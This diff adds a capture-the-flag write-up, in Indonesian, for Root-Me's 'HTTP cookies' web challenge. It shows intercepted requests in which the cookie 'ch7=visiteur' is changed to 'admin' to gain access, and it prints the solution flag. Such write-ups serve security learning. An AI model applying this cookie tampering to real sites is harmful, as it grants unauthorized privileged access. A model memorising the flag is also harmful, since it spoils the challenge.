@@ -1,0 +1,58 @@
+Soal : http://challenge01.root-me.org/web-serveur/ch7/
+
+	Challenge's Name : HTTP cookies
+	
+	Request : PS : Bob really love cookies
+	
+	Solusi : 
+	
+	Akses url http://challenge01.root-me.org/web-serveur/ch7/
+	pada url tersebut kita mendapatkan sebuah form email
+	
+	isi form email tersebut dengan email sembarang contoh : test@test.com
+	kemudian coba tamper dengan addon mozilla tamper data hasilnya adalah
+	
+	User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+	Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language=en-US,en;q=0.5
+	Accept-Encoding=gzip, deflate
+	Referer=http://challenge01.root-me.org/web-serveur/ch7/
+	Cookie=ch7=visiteur
+	Connection=keep-alive
+	Upgrade-Insecure-Requests=1
+	Content-Type=application/x-www-form-urlencoded
+	Content-Length=32
+	POSTDATA=mail=test%40test.com&jsep4b=send
+	
+	pada request soal terdapat hint "Bob really love cookies"
+	perhatikan cookie pada temper data 
+	
+	"Cookie-ch7=visiteur"
+	
+	visiteur dalam bahasa france jika di translate dalam bhs inggris visitor
+	yang artinya cookie sebagai visitor bagai mana jika kita ubah menjadi admin dengan temper data
+	
+	Hasilnya adalah seperti dibawah ini
+	
+	Host=challenge01.root-me.org
+	User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+	Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language=en-US,en;q=0.5
+	Accept-Encoding=gzip, deflate
+	Referer=http://challenge01.root-me.org/web-serveur/ch7/
+	Cookie=ch7=admin
+	Connection=keep-alive
+	Upgrade-Insecure-Requests=1
+	Content-Type=application/x-www-form-urlencoded
+	Content-Length=32
+	POSTDATA=mail=test%40test.com&jsep4b=send
+	
+	perhatikan perubahan Cookie=ch7=admin
+	
+	dan otomatis mendapatkan flag
+	
+	Validation password : ml-SYMPA
+
+	Email saved
+	
+	Flag : ml-SYMPA
